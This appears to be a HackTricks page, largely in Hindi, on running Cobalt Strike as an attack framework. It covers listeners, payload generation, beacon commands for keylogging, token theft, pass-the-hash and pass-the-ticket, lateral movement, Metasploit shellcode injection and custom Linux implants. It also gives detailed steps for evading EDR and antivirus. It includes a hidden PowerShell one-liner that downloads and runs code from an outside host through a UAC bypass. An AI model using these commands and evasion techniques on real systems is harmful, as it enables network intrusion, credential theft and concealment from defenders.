# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` फिर आप चुन सकते हैं कि कहाँ listen करना है, किस प्रकार के beacon का उपयोग करना है (http, dns, smb...) और अन्य विकल्प।

### Peer2Peer Listeners

इन listeners के beacons को सीधे C2 से communicate करने की आवश्यकता नहीं होती; वे अन्य beacons के माध्यम से इसके साथ communicate कर सकते हैं।

`Cobalt Strike -> Listeners -> Add/Edit` फिर आपको TCP या SMB beacons चुनने होंगे।

* **TCP beacon चयनित port पर listener सेट करेगा**। TCP beacon से connect करने के लिए किसी अन्य beacon से `connect <ip> <port>` command का उपयोग करें।
* **smb beacon चयनित नाम वाले pipename पर listen करेगा**। SMB beacon से connect करने के लिए `link [target] [pipe]` command का उपयोग करें।

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* HTA files के लिए **`HTMLApplication`**
* macro वाले office document के लिए **`MS Office Macro`**
* .exe, .dll orr service .exe के लिए **`Windows Executable`**
* **stageless** .exe, .dll या service .exe के लिए **`Windows Executable (S)`** (staged की तुलना में stageless बेहतर है, क्योंकि कम IoCs होते हैं)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` यह cobalt strike से beacon download करने के लिए bitsadmin, exe, powershell और python जैसे formats में एक script/executable generate करेगा।

#### Host Payloads

यदि आपके पास पहले से वह file है जिसे आप web sever पर host करना चाहते हैं, तो `Attacks -> Web Drive-by -> Host File` पर जाएँ और host करने के लिए file तथा web server config चुनें।

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- एक custom agent को केवल Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) में register/check-in करने और tasks प्राप्त करने के लिए communicate करना आवश्यक है। Profile में परिभाषित समान URIs/headers/metadata crypto को implement करके tasking और output के लिए Cobalt Strike UI का पुनः उपयोग किया जा सकता है।<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- एक Aggressor Script (जैसे, `CustomBeacon.cna`) non-Windows beacon के लिए payload generation को wrap कर सकता है, ताकि operators listener चुन सकें और सीधे GUI से ELF payloads बना सकें।
- Team Server के सामने उपलब्ध कराए गए Linux task handlers के उदाहरण: `sleep`, `cd`, `pwd`, `shell` (arbitrary commands execute करना), `ls`, `upload`, `download`, और `exit`। ये Team Server द्वारा अपेक्षित task IDs से map होते हैं और proper format में output लौटाने के लिए server-side implement किए जाने चाहिए।
- Linux पर BOF support को [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) के साथ Beacon Object Files को in-process load करके जोड़ा जा सकता है (यह Outflank-style BOFs को भी support करता है)। इससे modular post-exploitation को नए processes spawn किए बिना implant के context/privileges के अंदर चलाया जा सकता है।<sup>[[2]](#references)[[3]](#references)</sup>
- Windows Beacons के साथ pivoting parity बनाए रखने के लिए custom beacon में SOCKS handler embed करें: जब operator `socks <port>` चलाए, तो implant को एक local proxy खोलना चाहिए, जिससे operator tooling को compromised Linux host के माध्यम से internal networks में route किया जा सके।

## Opsec

### Execute-Assembly

**`execute-assembly`** remote process injection का उपयोग करके indicated program को execute करने के लिए एक **sacrificial process** का उपयोग करता है। यह बहुत noisy है, क्योंकि किसी process के अंदर inject करने के लिए कुछ Win APIs का उपयोग किया जाता है, जिन्हें हर EDR check करता है। हालांकि, कुछ custom tools हैं जिनका उपयोग उसी process में कुछ load करने के लिए किया जा सकता है:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike में आप BOF (Beacon Object Files) का भी उपयोग कर सकते हैं: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` Cobalt Strike में `helpx` command बनाएगा, जो commands में colors जोड़ता है और बताता है कि वे BOFs (green), Frok&Run (yellow) और इसी प्रकार के हैं, या ProcessExecution, injection अथवा इसी प्रकार के (red) हैं। इससे यह जानने में सहायता मिलती है कि कौन-से commands अधिक stealthy हैं।

### Act as the user

आप `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` जैसे events check कर सकते हैं:

- Security EID 4624 - सामान्य working hours जानने के लिए सभी interactive logons check करें।
- System EID 12,13 - shutdown/startup/sleep frequency check करें।
- Security EID 4624/4625 - inbound valid/invalid NTLM attempts check करें।
- Security EID 4648 - यह event तब बनता है जब plaintext credentials का उपयोग logon के लिए किया जाता है। यदि इसे किसी process ने generate किया है, तो binary में credentials किसी config file या code के अंदर clear text में हो सकते हैं।

Cobalt Strike से `jump` का उपयोग करते समय, नए process को अधिक legitimate दिखाने के लिए `wmi_msbuild` method का उपयोग करना बेहतर है।

### Use computer accounts

Defenders द्वारा users से उत्पन्न होने वाले अजीब behaviours को check करना और `*$` जैसे **service accounts और computer accounts को अपनी monitoring से exclude करना** सामान्य है। आप इन accounts का उपयोग lateral movement या privilege escalation के लिए कर सकते हैं।

### Use stageless payloads

Stageless payloads, staged payloads की तुलना में कम noisy होते हैं, क्योंकि उन्हें C2 server से second stage download करने की आवश्यकता नहीं होती। इसका अर्थ है कि initial connection के बाद वे कोई network traffic generate नहीं करते, जिससे network-based defenses द्वारा उनके detect होने की संभावना कम हो जाती है।

### Tokens & Token Store

Tokens को steal या generate करते समय सावधान रहें, क्योंकि कोई EDR thread tokens enumerate कर सकता है और process के अंदर **किसी अलग user से संबंधित token** या यहां तक कि SYSTEM token का पता लगा सकता है।

इससे tokens को **per beacon** store किया जा सकता है, इसलिए उसी token को बार-बार steal करने की आवश्यकता नहीं होती। यह lateral movement के लिए या तब उपयोगी है जब आपको किसी stolen token का कई बार उपयोग करना हो:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Lateral movement करते समय आमतौर पर **नया token generate करने** या pass the hash attack करने की तुलना में **किसी token को steal करना बेहतर होता है**।

### Guardrails

Cobalt Strike में **Guardrails** नामक एक feature है, जो कुछ ऐसे commands या actions के उपयोग को रोकने में सहायता करता है जिनका defenders द्वारा पता लगाया जा सकता है। Guardrails को specific commands block करने के लिए configure किया जा सकता है, जैसे `make_token`, `jump`, `remote-exec`, और अन्य commands, जिनका उपयोग आमतौर पर lateral movement या privilege escalation के लिए किया जाता है।

इसके अलावा, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) में कुछ checks और ideas भी हैं, जिन्हें payload execute करने से पहले consider किया जा सकता है।

### Tickets encryption

AD में tickets के encryption को लेकर सावधान रहें। Default रूप से कुछ tools Kerberos tickets के लिए RC4 encryption का उपयोग करेंगे, जो AES encryption से कम secure है, जबकि up-to-date environments में default रूप से AES का उपयोग किया जाएगा। Weak encryption algorithms के लिए monitoring करने वाले defenders इसका पता लगा सकते हैं।

### Avoid Defaults

Cobalt Stricke का उपयोग करते समय default रूप से SMB pipes के नाम `msagent_####` और `"status_####"` होंगे। इन नामों को बदलें। Cobal Strike से command `ls \\.\pipe\` द्वारा existing pipes के नाम check किए जा सकते हैं।

इसके अलावा, SSH sessions के साथ `\\.\pipe\postex_ssh_####` नामक pipe बनाया जाता है। इसे `set ssh_pipename "<new_name>";` से बदलें।

Poext exploitation attack में भी pipes `\\.\pipe\postex_####` को `set pipename "<new_name>"` से modify किया जा सकता है।

Cobalt Strike profiles में आप निम्न चीजें भी modify कर सकते हैं:

- `rwx` के उपयोग से बचना
- Process injection behaviour कैसे काम करता है (`process-inject {...}` block में कौन-से APIs उपयोग किए जाएंगे)
- "fork and run" कैसे काम करता है (`post-ex {…}` block में)
- Sleep time
- Memory में load की जाने वाली binaries का max size
- `stage {...}` block के साथ memory footprint और DLL content
- Network traffic

### Bypass memory scanning

कुछ ERDs memory को ज्ञात malware signatures के लिए scan करते हैं। Coblat Strike `sleep_mask` function को BOF के रूप में modify करने की अनुमति देता है, जो memory में bacldoor को encrypt कर सकता है।

### Noisy proc injections

किसी process में code inject करना आमतौर पर बहुत noisy होता है, क्योंकि **कोई regular process सामान्यतः यह action perform नहीं करता और ऐसा करने के तरीके बहुत सीमित हैं**। इसलिए, behaviour-based detection systems इसका पता लगा सकते हैं। इसके अलावा, EDRs network को ऐसे **threads के लिए scan करके भी इसका पता लगा सकते हैं जिनमें disk पर मौजूद न होने वाला code हो** (हालांकि JIT का उपयोग करने वाले browsers जैसे processes में यह सामान्य है)। Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

नया process spawn करते समय processes के बीच **एक regular parent-child** relationship बनाए रखना महत्वपूर्ण है, ताकि detection से बचा जा सके। यदि svchost.exec, iexplorer.exe को execute कर रहा है, तो यह suspicious लगेगा, क्योंकि normal Windows environment में svchost.exe, iexplorer.exe का parent नहीं होता।

जब Cobalt Strike में default रूप से नया beacon spawn किया जाता है, तो नए listener को run करने के लिए **`rundll32.exe`** का उपयोग करने वाला process बनाया जाता है। यह बहुत stealthy नहीं है और EDRs द्वारा आसानी से detect किया जा सकता है। इसके अलावा, `rundll32.exe` को बिना किसी args के run किया जाता है, जिससे यह और भी suspicious लगता है।

निम्न Cobalt Strike command से आप नए beacon को spawn करने के लिए कोई अलग process specify कर सकते हैं, जिससे उसके detect होने की संभावना कम हो जाती है:
```bash
spawnto x86 svchost.exe
```
आप profile में यह setting **`spawnto_x86` और `spawnto_x64`** भी बदल सकते हैं।

### Attackers के traffic को Proxy करना

Attackers को कभी-कभी tools को locally चलाने में सक्षम होना पड़ता है, यहाँ तक कि Linux machines पर भी, और victims के traffic को उस tool तक पहुँचाना पड़ता है (जैसे NTLM relay)।

इसके अलावा, कभी-कभी pass-the.hash या pass-the-ticket attack करने के लिए attacker के लिए इस hash या ticket को locally अपने LSASS process में **add करना** अधिक stealthy होता है। इसके बाद वह victim machine के LSASS process को modify करने के बजाय उसी से pivot कर सकता है।

हालाँकि, आपको **generated traffic के प्रति सावधान** रहना होगा, क्योंकि आपके backdoor process से uncommon traffic (kerberos?) भेजा जा सकता है। इसके लिए आप किसी browser process पर pivot कर सकते हैं (हालाँकि खुद को किसी process में inject करते हुए आप पकड़े जा सकते हैं, इसलिए ऐसा करने का कोई stealth तरीका सोचें)।

### AVs से बचना

#### AV/AMSI/ETW Bypass

यह page देखें:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

आमतौर पर `/opt/cobaltstrike/artifact-kit` में आपको उन payloads का code और pre-compiled templates ( `/src-common` में) मिल सकते हैं, जिनका उपयोग cobalt strike binary beacons generate करने के लिए करेगा।

Generated backdoor (या केवल compiled template) के साथ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके आप पता लगा सकते हैं कि defender को trigger करने वाली चीज़ क्या है। यह आमतौर पर कोई string होती है। इसलिए आप केवल उस code को modify कर सकते हैं जो backdoor generate कर रहा है, ताकि वह string final binary में दिखाई न दे।

Code modify करने के बाद उसी directory से `./build.sh` चलाएँ और `dist-pipe/` folder को Windows client में `C:\Tools\cobaltstrike\ArtifactKit` पर copy करें।
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
यह सुनिश्चित करें कि aggressive script `dist-pipe\artifact.cna` load हो, ताकि Cobalt Strike उन resources का उपयोग करे जिन्हें हम disk से चाहते हैं, न कि load किए गए resources का।

#### Resource Kit

ResourceKit folder में Cobalt Strike के script-based payloads के templates होते हैं, जिनमें PowerShell, VBA और HTA शामिल हैं।

Templates के साथ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके आप पता लगा सकते हैं कि Defender (इस मामले में AMSI) को क्या पसंद नहीं आ रहा है और उसे modify कर सकते हैं:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
पहचानी गई lines को modify करके ऐसा template बनाया जा सकता है जिसे detect नहीं किया जाएगा।

`ResourceKit\resources.cna` aggressive script को load करना न भूलें, ताकि Cobalt Strike को यह बताया जा सके कि वह disk से हमारे इच्छित resources का उपयोग करे, न कि पहले से load किए गए resources का।

#### Function hooks | Syscall

Function hooking, malicious activity का पता लगाने के लिए ERDs की एक बहुत common method है। Cobalt Strike, standard Windows API calls के बजाय **syscalls** का उपयोग करके इन hooks को bypass करने की अनुमति देता है। इसके लिए **`None`** config का उपयोग किया जा सकता है, या **`Direct`** setting के साथ किसी function के `Nt*` version का उपयोग किया जा सकता है, अथवा malleable profile में **`Indirect`** option के साथ सीधे `Nt*` function के ऊपर jump किया जा सकता है। System के आधार पर, कोई एक option दूसरे की तुलना में अधिक stealthy हो सकता है।

इसे profile में या **`syscall-method`** command का उपयोग करके set किया जा सकता है।

हालांकि, इससे भी noise उत्पन्न हो सकता है।

Function hooks को bypass करने के लिए Cobalt Strike द्वारा दिया गया एक option इन hooks को [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) से remove करना है।

आप [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) या [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) से यह भी check कर सकते हैं कि कौन-से functions hooked हैं।




<details>
<summary>विविध Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader और Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike metadata encryption का Unit42 विश्लेषण](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike traffic पर SANS ISC diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
